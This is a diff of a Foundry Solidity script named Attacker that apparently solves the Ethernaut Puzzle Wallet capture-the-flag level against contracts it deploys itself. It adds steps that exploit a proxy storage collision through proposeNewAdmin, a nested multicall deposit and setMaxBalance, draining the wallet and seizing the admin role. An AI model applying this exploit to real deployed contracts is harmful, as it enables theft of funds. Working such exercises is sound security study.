@@ -8,8 +8,8 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 contract Attacker is Test {
     function test() external {
         vm.startBroadcast();
-        PuzzleWallet impl = new PuzzleWallet();
-        impl.init(10000);
+        PuzzleWallet impl = new PuzzleWallet{value: 0.001 ether}();
+        impl.init(type(uint256).max);
         bytes memory init;
         PuzzleProxy proxy = new PuzzleProxy(msg.sender, address(impl), init);
 
@@ -23,10 +23,13 @@ contract Attacker is Test {
             depositSelector
         );
 
+        // become the owner of PuzzleWallet contract
         proxy.proposeNewAdmin(msg.sender);
         impl.addToWhitelist(msg.sender);
         impl.multicall{value: 0.001 ether}(nestedMulticall);
-
+        impl.execute(msg.sender, 0.002 ether, "");
+        impl.setMaxBalance(uint256(uint160(msg.sender)));
+        console.log("New Admin is : ", proxy.admin());
         vm.stopBroadcast();
     }
 }
